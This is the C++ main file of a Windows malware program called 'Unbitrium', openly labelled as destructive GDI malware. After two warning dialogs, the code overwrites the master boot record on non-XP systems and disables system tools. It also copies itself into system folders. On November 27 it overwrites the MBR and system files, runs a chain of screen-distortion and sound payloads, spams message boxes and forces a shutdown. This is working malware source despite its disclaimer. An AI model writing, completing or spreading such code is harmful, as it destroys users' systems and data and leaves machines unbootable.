#include "Unbitrium.h"

/* Btw I gotta thank VenraTech for HSV and how to make it. */

INT LAPIENTRY sWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, INT nCmdShow) {
	if (GetFileAttributesW(L"C:\\WINDOWS\\System32\\264.dat") == INVALID_FILE_ATTRIBUTES) {
		if (MessageBoxW(NULL, L"Unbitrium\n\nThis is a GDI malware that will destroy your system and overwrite some system files.\nNotCCR is not responsible for any damages made with this malware.\n\nIf you are running this on real hardware, shut this malware down quickly and remove it!\nBut if you are on a VM, the damage rate is very low.\nAs said earlier, keep in mind that NotCCR, the creator of this malware, is not responsible for any actions taken as a result of this malware.\nProceed?\n\nSpecial thanks to Gustaa for beta testing!", L"ELEMENT 123", MB_ICONWARNING | MB_YESNO | MB_DEFBUTTON2) != IDYES) exit(0);
		if (MessageBoxW(NULL, L"Final warning!\n\nAny decision you make is final, and this only executes on November 27th!\nThis will overwrite your MBR!\nExecute it?", L"ELEEMEJKMTN 232", MB_ICONWARNING | MB_YESNO | MB_DEFBUTTON2) != IDYES) exit(0);
		if (!System::IfWindowsXP()) {
			Payloads::OverwriteMBR();
			NotWindowsXP::WallpaperPayload();
			MessageBoxW(NULL, L"Try to restart now!\nMBR overwritten.", L"Unbitrium.exe - Wrong Operating System Version", MB_OK);
		}
	}
	
	Payloads::SystemToolDisabler();
	Payloads::CopyToSystemFolders();
	
	if (System::DateCheck(1) == 11 && System::DateCheck(2) == 27) {
		Payloads::OverwriteMBR();
		Payloads::OverwriteFiles();
		Sleep(3000);
		CreateThread(NULL, 0, &Payloads::WindowPayload, NULL, 0, 0);
		HANDLE Cursor = CreateThread(NULL, 0, &Payloads::CursorPayload, NULL, 0, 0);
		CreateThread(NULL, 0, &Payloads::UncloseWindows, NULL, 0, 0);
		HANDLE hStr = CreateThread(NULL, 0, &Payloads::SetStrings, NULL, 0, 0);
		
		
		// BYTEBEAT 1 //
		Bytebeat::Bytebeat1();
		
		// INITIAL GRADIENT RECT //
		HHEAP hIGRM = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE | HEAP_NO_SERIALIZE, sizeof(CHAR) * 8192 * 64, 0);
		HANDLE hIGR = CreateThread(NULL, 0, &GDI::InitialGradientRect, hIGRM, 0, 0);
		
		// INVERTED ROTATING RHOMBUS //
		HHEAP hARIRM = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE | HEAP_NO_SERIALIZE, sizeof(CHAR) * 8192 * 64, 0);
		HANDLE hARIR = CreateThread(NULL, 0, &GDI::AnimRotoInvRhombus, hARIRM, 0, 0);
		
		// INITIAL HSV //
		HHEAP hICM = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE | HEAP_NO_SERIALIZE, sizeof(CHAR) * 8192 * 64, 0);
		HANDLE hIC = CreateThread(NULL, 0, &GDI::InitialColorize, hICM, 0, 0);
		
		// INITIAL TAN WAVES //
		HHEAP hTWM = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE | HEAP_NO_SERIALIZE, sizeof(CHAR) * 8192 * 64, 0);
		HANDLE hTW = CreateThread(NULL, 0, &GDI::TanWaves, hTWM, 0, 0);
		
		Sleep(29 * 1000);
		// why
		EndHandle(hIC, hICM); EndHandle(hTW, hTWM);
		rdw();
		
		// BYTEBEAT 2 //
		Bytebeat::Bytebeat2();
		
		// BOUNCING HEPTAGON //
		HHEAP hAHM = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE | HEAP_NO_SERIALIZE, sizeof(CHAR) * 8192 * 64, 0);
		HANDLE hAH = CreateThread(NULL, 0, &GDI::AnimHeptagon, hAHM, 0, 0);
		
		// GRADIENT TRIANGLES //
		HHEAP hGGTM = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE | HEAP_NO_SERIALIZE, sizeof(CHAR) * 8192 * 64, 0);
		HANDLE hGGT = CreateThread(NULL, 0, &GDI::GrayscaleGradientTriangles, hGGTM, 0, 0);
		
		// TILTED XOR HSV + SHAKING //
		HHEAP hTXORSM = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE | HEAP_NO_SERIALIZE, sizeof(CHAR) * 8192 * 64, 0);
		HANDLE hTXORS = CreateThread(NULL, 0, &GDI::TiltedXORHSVShake, hTXORSM, 0, 0);
		Sleep(30 * 1000);
		
		EndHandle(hAH, hAHM); EndHandle(hGGT, hGGTM); EndHandle(hTXORS, hTXORSM);
		rdw();
		
		Sleep(100);
		
		// BYTEBEAT 3 //
		Bytebeat::Bytebeat3();
		
		// PLASMA HSV //
		HHEAP hHSVPM = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE | HEAP_NO_SERIALIZE, sizeof(CHAR) * 8192 * 64, 0);
		HANDLE hHSVP = CreateThread(NULL, 0, &GDI::HSVPlasma, hHSVPM, 0, 0);
		
		// TEXTOUT //
		HHEAP hSFTM = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE | HEAP_NO_SERIALIZE, sizeof(CHAR) * 8192 * 64, 0);
		HANDLE hSFT = CreateThread(NULL, 0, &GDI::SystemFileTexts, hSFTM, 0, 0);
		
		// ALPHABLEND STRETCHING //
		HHEAP hASM = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE | HEAP_NO_SERIALIZE, sizeof(CHAR) * 8192 * 64, 0);
		HANDLE hAS = CreateThread(NULL, 0, &GDI::AlphaStretch, hASM, 0, 0);
		
		Sleep(30 * 1000);
		EndHandle(hHSVP, hHSVPM); EndHandle(hSFT, hSFTM); EndHandle(hAS, hASM); EndHandle(hARIR, hARIRM);
		rdw();
		
		Sleep(100);
		
		// BYTEBEAT 4 //
		Bytebeat::Bytebeat4();
		
		// PLGBLT ANGLE GLIDING //
		HHEAP hAGM = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE | HEAP_NO_SERIALIZE, sizeof(CHAR) * 8192 * 64, 0);
		HANDLE hAG = CreateThread(NULL, 0, &GDI::AngleGlide, hAGM, 0, 0);
		
		// RAINBOW STRETCHING WITH ICONS //
		HHEAP hRSwIM = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE | HEAP_NO_SERIALIZE, sizeof(CHAR) * 8192 * 64, 0);
		HANDLE hRSwI = CreateThread(NULL, 0, &GDI::RainbowStretchWithIcons, hRSwIM, 0, 0);
		
		// BOUNCING GRADIENT RECTANGLE //
		HHEAP hGAGRM = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE | HEAP_NO_SERIALIZE, sizeof(CHAR) * 8192 * 64, 0);
		HANDLE hGAGR = CreateThread(NULL, 0, &GDI::GrayscaleAnimGradientRect, hGAGRM, 0, 0);
		
		Sleep(31 * 1000);
		EndHandle(hAG, hAGM); EndHandle(hRSwI, hRSwIM); EndHandle(hGAGR, hGAGRM);
		rdw();
		
		Sleep(100);
		
		EndHandle(hIGR, hIGRM);
		EndHandle(Cursor, NULL);
		
		// BYTEBEAT 5 //
		Bytebeat::Bytebeat5();
		
		// RGBQUAD PLASMA //
		HHEAP hRGBPM = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE | HEAP_NO_SERIALIZE, sizeof(CHAR) * 8192 * 64, 0);
		HANDLE hRGBP = CreateThread(NULL, 0, &GDI::RGBPlasma, hRGBPM, 0, 0);
		
		// TINTED SCREEN BOUNCING //
		HHEAP hTSBM = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE | HEAP_NO_SERIALIZE, sizeof(CHAR) * 8192 * 64, 0);
		HANDLE hTSB = CreateThread(NULL, 0, &GDI::TintScreenBounce, hTSBM, 0, 0);
		
		// RECTANGLE CURSOR RADIUS //
		HHEAP hRCRM = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE | HEAP_NO_SERIALIZE, sizeof(CHAR) * 8192 * 64, 0);
		HANDLE hRCR = CreateThread(NULL, 0, &GDI::RectangleCurRadius, hRCRM, 0, 0);
		
		Sleep(30 * 1000);
		
		EndHandle(hRGBP, hRGBPM); EndHandle(hTSB, hTSBM); EndHandle(hRCR, hRCRM);
		rdw();
		
		Sleep(100);
		
		// BYTEBEAT 6 //
		Bytebeat::Bytebeat6();
		
		// MESSAGEBOX SPAM //
		EndHandle(hStr, NULL);
		HANDLE hMsg = CreateThread(NULL, 0, &Payloads::MessageSpam, NULL, 0, 0);
		
		// XOR HSL //
		HHEAP hXORM = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE | HEAP_NO_SERIALIZE, sizeof(CHAR) * 8192 * 64, 0);
		HANDLE hXOR = CreateThread(NULL, 0, &GDI::XORHSL, hXORM, 0, 0);
		
		// TAN STRETCHBLT //
		HHEAP hSTanM = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE | HEAP_NO_SERIALIZE, sizeof(CHAR) * 8192 * 64, 0);
		HANDLE hSTan = CreateThread(NULL, 0, &GDI::StretchTangent, hSTanM, 0, 0);
		
		// RANDOM CIRCLES //
		HHEAP hRCM = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE | HEAP_NO_SERIALIZE, sizeof(CHAR) * 8192 * 64, 0);
		HANDLE hRC = CreateThread(NULL, 0, &GDI::RandomCircles, hRCM, 0, 0);
		
		Sleep(28 * 1000);
		
		EndHandle(hXOR, hXORM); EndHandle(hSTan, hSTanM); EndHandle(hRC, hRCM);
		rdw();
		
		Sleep(100);
		EndHandle(hMsg, NULL);
		
		// LAST RGBQUAD SHADER //
		HHEAP hLRGBSM = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE | HEAP_NO_SERIALIZE, sizeof(CHAR) * 8192 * 64, 0);
		HANDLE hLRGBS = CreateThread(NULL, 0, &GDI::LastRGBShader, NULL, 0, 0);
		
		Sleep(5 * 1000);
		
		AdjShutdownPriv();
		InitiateSystemShutdownW(NULL, (WCHAR*)L"System trashed", 0, true, true);
	}
}
